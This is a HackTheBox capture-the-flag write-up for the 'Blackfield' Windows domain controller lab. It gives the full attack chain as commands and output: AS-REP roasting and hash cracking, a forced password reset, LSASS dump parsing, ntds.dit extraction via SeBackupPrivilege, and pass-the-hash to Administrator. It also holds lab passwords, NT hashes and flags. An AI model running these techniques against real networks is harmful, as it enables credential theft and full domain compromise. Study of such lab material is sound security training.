---
layout: post
title: "HackTheBox — Blackfield"
date: 2026-06-28
categories: [HackTheBox, Active Directory, Windows]
tags: [htb, ctf, active-directory, asrep-roasting, bloodhound, sebackupprivilege, lsass, ntds, winrm, oscp]
difficulty: Hard
os: Windows
---

# HackTheBox — Blackfield

| Field          | Detail                      |
|----------------|-----------------------------|
| **OS**         | Windows Server 2019         |
| **Difficulty** | Hard                        |
| **Domain**     | BLACKFIELD.local            |
| **IP**         | 10.129.22.160               |

---

## Reconnaissance

### Port Scan

```bash
nmap -sCV -vv --disable-arp-ping --min-rate 5000 -p- 10.129.22.160 -oN fullport.nmap
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: BLACKFIELD.local)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows AD LDAP (Domain: BLACKFIELD.local)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The presence of **Kerberos (88)**, **DNS (53)**, **LDAP (389)** and **SMB (445)** confirms a **Domain Controller**. The domain name is `BLACKFIELD.local`.

Add entries to `/etc/hosts`:

```bash
sudo nxc smb 10.129.22.160 --generate-hosts-file /etc/hosts
# 10.129.22.160   DC01.BLACKFIELD.local BLACKFIELD.local DC01
```

---

## SMB Enumeration

Anonymous login fails; guest login works and reveals two readable shares:

```bash
nxc smb 10.129.22.160 -u 'guest' -p '' --shares
```

```
Share        Permissions
-----        -----------
IPC$         READ
profiles$    READ
```

### Extracting Usernames from profiles$

The `profiles$` share contains hundreds of empty directories named after domain users:

```bash
smbmap -u guest -p '' -H 10.129.22.160 -r
smbmap -u guest -p '' -H 10.129.22.160 -r | grep 2020 | awk 'NR>2{print $8}' >> ad_users.txt
```

### Validating Users with Kerbrute

```bash
kerbrute userenum -d BLACKFIELD.local --dc 10.129.22.160 ad_users.txt
```

```
[+] VALID USERNAME: audit2020@BLACKFIELD.local
[+] VALID USERNAME: support@BLACKFIELD.local
[+] VALID USERNAME: svc_backup@BLACKFIELD.local
```

---

## AS-REP Roasting

The `support` account has `DONT_REQ_PREAUTH` set, making it vulnerable to AS-REP Roasting.

Sync the clock first (required for Kerberos):

```bash
# Get DC time from nmap smb2-time output, then:
sudo date -s "2026-06-28 21:19:00Z"
```

```bash
impacket-GetNPUsers BLACKFIELD.local/guest:'' -usersfile valid_users.txt
```

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:d26e31bb96ff37c7...
```

### Cracking the Hash

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:...: #00^BlackKnight
```

**Credentials:** `support : #00^BlackKnight`

---

## BloodHound Enumeration

```bash
rusthound-ce -d BLACKFIELD.local -i 10.129.22.160 -u support -p '#00^BlackKnight' -c All --zip
```

BloodHound reveals the following attack path:

```
support ──[ForceChangePassword]──► audit2020
audit2020 ──[READ]──► forensic share ──► lsass.DMP ──► svc_backup NT hash
svc_backup ──[SeBackupPrivilege]──► ntds.dit ──► Administrator NT hash
```

---

## Foothold — Support → Audit2020

Abusing `ForceChangePassword` to reset audit2020's password:

```bash
bloodyAD --host 10.129.22.160 -d BLACKFIELD.local -u support -p '#00^BlackKnight' set password audit2020 'password123!'
```

```
[+] Password changed successfully!
```

---

## Forensic Share — LSASS Dump

With `audit2020`, we now have READ access to the `forensic` share:

```bash
nxc smb 10.129.22.160 -u 'audit2020' -p 'password123!' --shares
# forensic   READ
```

```bash
impacket-smbclient BLACKFIELD.local/audit2020:'password123!'@10.129.22.160
```

Inside `memory_analysis/` we find process memory dumps. The most valuable one:

```
/memory_analysis/lsass.zip
```

```bash
# Download and extract
get lsass.zip
unzip lsass.zip   # → lsass.DMP
```

### Dumping Credentials from LSASS

```bash
pypykatz lsa minidump lsass.DMP >> lsass.txt
grep username lsass.txt
```

Relevant entry for `svc_backup`:

```
username  : svc_backup
NT        : 9658d1d1dcd9250115e2205d9f48400d
AES256    : 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
```

---

## WinRM Access — svc_backup

```bash
nxc winrm 10.129.22.160 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
# [+] BLACKFIELD.local\svc_backup:... (Pwn3d!)
```

```bash
evil-winrm -i BLACKFIELD.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

### User Flag

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```

---

## Privilege Escalation — SeBackupPrivilege

Checking privileges:

```
*Evil-WinRM* PS C:\> whoami /priv

Privilege Name                Description
============================= ==============================
SeBackupPrivilege             Back up files and directories
SeRestorePrivilege            Restore files and directories
```

`SeBackupPrivilege` allows reading any file on the system, bypassing ACLs — including `ntds.dit`.

### Shadow Copy & ntds.dit Extraction

Create a diskshadow script (`z2k.dsh`):

```
set context persistent nowriters
add volume c: alias z2k
create
expose %z2k% z:
```

Convert to Windows line endings and upload:

```bash
unix2dos z2k.dsh
# In evil-winrm:
upload z2k.dsh
```

Run diskshadow and copy `ntds.dit` via backup privilege:

```
*Evil-WinRM* PS C:\Windows\Temp> diskshadow /s z2k.dsh
*Evil-WinRM* PS C:\Windows\Temp> robocopy /b z:\windows\ntds . ntds.dit
```

Save the SYSTEM hive for decryption:

```
*Evil-WinRM* PS C:\Windows\Temp> reg save hklm\system system.hive
```

Download both files:

```
*Evil-WinRM* PS C:\Windows\Temp> download ntds.dit
*Evil-WinRM* PS C:\Windows\Temp> download system.hive
```

---

## Dumping Domain Hashes

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive local
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:...
support:1104:...
```

### Pass-the-Hash as Administrator

```bash
evil-winrm -i 10.129.22.160 -u 'Administrator' -H 184fb5e5178480be64824d4cd53b99ee
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```

---

## Attack Chain

```
guest (SMB) ──► profiles$ share
                    │
              username enumeration
                    │
              kerbrute validation
                    │
           support (AS-REP Roastable)
                    │
           crack → #00^BlackKnight
                    │
           BloodHound enumeration
                    │
    [ForceChangePassword]──► audit2020
                                │
                          forensic share
                                │
                           lsass.DMP
                                │
                    svc_backup NT hash (PtH)
                                │
                          WinRM access
                                │
                     user.txt ✓
                                │
                    SeBackupPrivilege
                                │
               Shadow Copy → ntds.dit + SYSTEM
                                │
             impacket-secretsdump → Administrator hash
                                │
                    PtH → root.txt ✓
```

---

## Tools Used

| Tool                    | Purpose                                      |
|-------------------------|----------------------------------------------|
| nmap                    | Port scanning                                |
| netexec (nxc)           | SMB enumeration & WinRM validation           |
| smbmap                  | Share content enumeration                    |
| kerbrute                | Domain user validation                       |
| impacket-GetNPUsers     | AS-REP Roasting                              |
| hashcat                 | AS-REP hash cracking                         |
| rusthound-ce            | BloodHound data collection                   |
| BloodHound              | AD attack path analysis                      |
| bloodyAD                | Password reset via ACL abuse                 |
| impacket-smbclient      | SMB share navigation                         |
| pypykatz                | LSASS dump parsing                           |
| evil-winrm              | Remote shell via WinRM                       |
| diskshadow + robocopy   | ntds.dit extraction via SeBackupPrivilege    |
| impacket-secretsdump    | Offline NTDS hash extraction                 |

---

## Key Takeaways

- **Guest SMB access** can be enough to extract a valid username list — always enumerate accessible shares, even read-only ones.
- **AS-REP Roasting** is still highly effective when `DONT_REQ_PREAUTH` is misconfigured; always check for it after obtaining a user list.
- **LSASS dumps on forensic shares** are an often-overlooked goldmine — a forensic share intended for defenders can hand credentials to an attacker.
- **SeBackupPrivilege** is as dangerous as `SeDebugPrivilege` — it allows reading any file on the system and is a direct path to `ntds.dit`.
- **Pass-the-Hash** remains a reliable lateral movement technique when plaintext passwords are unavailable.

---
